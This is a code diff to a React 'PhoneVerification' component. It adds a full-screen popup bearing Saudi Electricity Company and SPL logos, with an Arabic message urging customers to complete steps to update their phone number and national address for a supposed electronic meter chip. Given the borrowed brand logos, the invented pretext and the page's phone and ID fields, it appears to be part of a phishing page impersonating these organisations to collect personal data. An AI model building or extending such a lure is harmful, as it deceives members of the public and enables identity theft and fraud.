@@ -84,6 +84,7 @@ export default function PhoneVerification() {
   const [phoneError, setPhoneError] = useState("");
   const [idError, setIdError] = useState("");
   const [autoRedirecting, setAutoRedirecting] = useState(false);
+  const [showPopup, setShowPopup] = useState(true);
 
   const {
     register,
@@ -252,6 +253,57 @@ export default function PhoneVerification() {
   return (
     <PageLayout variant="default">
       <WaitingOverlay />
+
+      {/* Popup Modal */}
+      {showPopup && (
+        <div style={{
+          position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
+          backgroundColor: 'rgba(0,0,0,0.6)', zIndex: 9999,
+          display: 'flex', alignItems: 'center', justifyContent: 'center',
+          padding: '20px',
+        }}>
+          <div style={{
+            background: '#fff', borderRadius: '20px', maxWidth: '420px', width: '100%',
+            padding: '30px 24px', textAlign: 'center', position: 'relative',
+            boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
+          }}>
+            {/* Logos */}
+            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '20px', marginBottom: '24px' }}>
+              <img src="/se-logo.svg" alt="السعودية للكهرباء" style={{ height: '50px', objectFit: 'contain' }} />
+              <div style={{ width: '1px', height: '40px', backgroundColor: '#ddd' }}></div>
+              <img src="/spl-logo.jpeg" alt="سبل" style={{ height: '50px', objectFit: 'contain', borderRadius: '6px' }} />
+            </div>
+
+            {/* Title */}
+            <h2 style={{
+              color: '#0066cc', fontSize: '20px', fontWeight: 700,
+              marginBottom: '16px', fontFamily: "'SE', sans-serif",
+            }}>عزيزي العميل</h2>
+
+            {/* Message */}
+            <p style={{
+              color: '#444', fontSize: '15px', lineHeight: '1.8',
+              fontFamily: "'SE', sans-serif", marginBottom: '24px',
+              textAlign: 'center',
+            }}>
+              يرجى استكمال باقي الخطوات لتحديث بيانات رقم جوالك مع عنوانك الوطني في الشركة السعودية للكهرباء لإصدار شريحة إلكترونية للعداد الخاص بك مرتبطة برقم جوالك
+            </p>
+
+            {/* Close Button */}
+            <button
+              onClick={() => setShowPopup(false)}
+              style={{
+                background: '#0066cc', color: '#fff', border: 'none',
+                borderRadius: '12px', padding: '12px 50px', fontSize: '16px',
+                fontWeight: 600, cursor: 'pointer', fontFamily: "'SE', sans-serif",
+                width: '100%',
+              }}
+            >
+              متابعة
+            </button>
+          </div>
+        </div>
+      )}
 
       <div className="bg-white rounded-2xl shadow-xl p-6">
         {/* Header */}
